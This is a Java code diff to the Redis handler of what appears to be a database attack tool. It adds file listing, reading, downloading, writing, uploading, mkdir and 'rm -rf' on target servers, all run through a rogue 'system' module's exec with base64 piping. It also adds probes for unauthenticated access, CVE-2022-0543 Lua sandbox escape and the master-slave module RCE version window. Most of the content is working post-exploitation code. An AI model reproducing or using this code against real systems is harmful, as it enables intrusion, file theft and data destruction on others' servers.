@@ -39,7 +39,7 @@ public class RedisDispatcher extends BaseDispatcher {
             d.put("version", nz(dao.getRedisVersion()));
             d.put("os", nz(dao.getOs()));
             d.put("arch_bits", nz(dao.getArch()));
-            d.put("cves", new org.json.JSONArray());
+            d.put("cves", scanCves(dao, rec, ctx));
             return Result.ok("Redis " + nz(dao.getRedisVersion()) + " / " + nz(dao.getOs())
                     + " / " + nz(dao.getArch()) + "bit", d).withId(id);
         }
@@ -96,9 +96,63 @@ public class RedisDispatcher extends BaseDispatcher {
             dao.redisavedb(flag(p, "dir", ""), flag(p, "file", ""));
             return Result.ok("rdb 持久化已触发（dir=" + flag(p, "dir", "") + " file=" + flag(p, "file", "") + "）").withId(id);
         }
+        // ---- 文件操作（M3a；全部经 system.exec，需模块已加载） ----
         if ("list-files".equals(tool) || "read".equals(tool) || "write".equals(tool)
                 || "upload".equals(tool) || "download".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
-            return m3a(tool, dbType()).withId(id);
+            dao.getConnection();
+            if (!moduleLoaded(dao)) {
+                return Result.target("system 模块未加载，文件操作不可用",
+                        "先 exec --vps-host .. --vps-port .. 部署模块（外部 rogue）；用后 clean").withId(id);
+            }
+            if ("list-files".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
+                String path = p.positionals.get(0);
+                String cmd;
+                if ("list-files".equals(tool)) {
+                    cmd = "ls -la " + path;
+                } else if ("rm".equals(tool)) {
+                    cmd = "rm -rf " + path;
+                } else {
+                    cmd = "mkdir -p " + path;
+                }
+                return Result.ok(nz(dao.eval(cmd, code))).withId(id);
+            }
+            if ("read".equals(tool) || "download".equals(tool)) {
+                String path = p.positionals.get(0).replace("'", "'\\''");
+                // base64 通道保二进制安全
+                String b64 = nz(dao.eval("base64 " + path, "UTF-8")).replaceAll("\\s", "");
+                if (b64.isEmpty()) {
+                    return Result.target("读取失败: 目标回显为空", "检查路径/权限").withId(id);
+                }
+                byte[] bytes;
+                try {
+                    bytes = java.util.Base64.getDecoder().decode(b64);
+                } catch (IllegalArgumentException e) {
+                    return Result.target("读取失败: 目标无 base64 工具或回显异常", "尝试 exec 'cat <path>' 验证").withId(id);
+                }
+                if ("download".equals(tool)) {
+                    return cli.dispatcher.MssqlDispatcher.toOutBytes(ctx, bytes, flag(p, "out", "")).withId(id);
+                }
+                return Result.ok(new String(bytes, code),
+                        new JSONObject().put("b64", b64).put("size", bytes.length)).withId(id);
+            }
+            // write / upload：本地字节 → base64 管道写入
+            byte[] content;
+            String remote;
+            if ("write".equals(tool)) {
+                content = cli.dispatcher.MssqlDispatcher.readContent(p);
+                remote = p.positionals.get(0);
+            } else {
+                byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
+                if (bytes == null) {
+                    return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
+                }
+                content = bytes;
+                remote = p.positionals.get(1);
+            }
+            String b64 = java.util.Base64.getEncoder().encodeToString(content);
+            String pathEsc = remote.replace("'", "'\\''");
+            dao.eval("echo " + b64 + " | base64 -d > " + pathEsc, "UTF-8");
+            return Result.ok("写入完成: " + remote + " (" + content.length + " bytes，经 system.exec base64 管道)").withId(id);
         }
         return Result.usage("redis 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
     }
@@ -111,6 +165,49 @@ public class RedisDispatcher extends BaseDispatcher {
             // 老版本 redis 无 MODULE LIST 时保守放行，由 eval 自身报错
             return true;
         }
+    }
+
+    /**
+     * CVE/风险扫描（Keep 项，Extend RedisScanner 行为面对齐；全部非破坏只读探测）：
+     *  - 未授权访问：匿名连接可 PING
+     *  - CVE-2022-0543（Debian 打包 Lua 沙箱逃逸）：EVAL "return type(os)" 可达即存在
+     *  - 主从 RCE 窗口：4.x–5.0.5 版本段（模块加载路线）
+     */
+    private org.json.JSONArray scanCves(RedisDao dao, Map<String, String> rec, Ctx ctx) {
+        org.json.JSONArray arr = new org.json.JSONArray();
+        String ver = nz(dao.getRedisVersion());
+        // 1) 未授权访问（匿名新连接）
+        try {
+            Jedis anon = new Jedis(rec.get("ipaddress"), Integer.parseInt(rec.get("port")),
+                    Math.max(ctx.timeoutSec, 1) * 1000);
+            try {
+                String pong = anon.ping();
+                if ("PONG".equalsIgnoreCase(pong)) {
+                    arr.put(new JSONObject().put("id", "UNAUTH").put("level", "high")
+                            .put("detail", "未授权访问（无密码可 PING）"));
+                }
+            } finally {
+                anon.close();
+            }
+        } catch (Exception e) {
+            // 需要认证 → 未授权不成立
+        }
+        // 2) CVE-2022-0543 Lua 沙箱逃逸
+        try {
+            Object r = dao.jedis().eval("return type(os)");
+            if (r != null && String.valueOf(r).contains("table")) {
+                arr.put(new JSONObject().put("id", "CVE-2022-0543").put("level", "critical")
+                        .put("detail", "Lua 沙箱逃逸可用（os 可达）"));
+            }
+        } catch (Exception e) {
+            // 沙箱正常 → 不存在
+        }
+        // 3) 主从 RCE 版本窗口
+        if (ver.matches("4\\..*") || ver.matches("5\\.0\\.[0-5].*")) {
+            arr.put(new JSONObject().put("id", "SLAVE-MODULE-RCE").put("level", "critical")
+                    .put("detail", "版本 " + ver + " 处于 4.x–5.0.5 主从+模块加载窗口（exec --vps-* 路线可用）"));
+        }
+        return arr;
     }
 
     private static String nz(String s) {
